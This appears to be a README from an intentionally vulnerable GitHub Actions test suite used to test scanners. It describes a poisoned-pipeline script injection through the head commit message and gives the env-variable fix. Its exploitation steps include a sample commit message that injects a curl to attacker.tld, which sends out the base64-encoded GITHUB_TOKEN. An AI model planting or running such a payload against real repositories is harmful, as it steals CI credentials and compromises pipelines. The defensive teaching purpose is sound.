# Scenario 32: Script injection via `github.event.head_commit.message`

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:** [`.github/workflows/scenario-32-script-injection-commit-message.yml`](../../.github/workflows/scenario-32-script-injection-commit-message.yml)

## What this variant probes

Same canonical bug as [scenario 02](../02-script-injection-issue-title/README.md)
— attacker-controlled `github.event.*` interpolated into a `run:` block
— but the untrusted context is the **commit message** of the head
commit on a `push` event.

Commit messages are one of the most overlooked entries on the untrusted-
input list because they "look like text." They're not: the message
string is interpolated verbatim into the generated shell script, and
anyone who can push (including via their own fork branch) can craft a
message containing shell metacharacters.

## How an attacker exploits it

1. Create a commit on any branch with the message:

   ```
   fix: typo "; curl https://attacker.tld/$(echo $GITHUB_TOKEN | base64) #"
   ```

2. Push the branch.
3. The workflow's `run: echo "Latest commit: ${{ github.event.head_commit.message }}"`
   step expands the message verbatim and executes the attacker's curl
   on the runner with the workflow's `GITHUB_TOKEN`.

Note: `github.event.head_commit.author.name` and `.author.email` are
equally controllable and equally dangerous; both are on octoscan's
documented untrusted-input list.

## Expected scanner coverage

Identical to scenario 02 — any scanner that names
`github.event.head_commit.message` (or the wildcarded
`github.event.commits.*.message`) on its untrusted-input list should
flag this.

## Fix

Same fix as scenario 02:

```yaml
- env:
    MSG: ${{ github.event.head_commit.message }}
  run: echo "Latest commit: $MSG"
```

## References

- [Scenario 02 — Script injection via issue title](../02-script-injection-issue-title/README.md)
  — full exploitation walkthrough applies here.
- [GitHub docs — Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
  ("Good practices for mitigating script injection attacks").
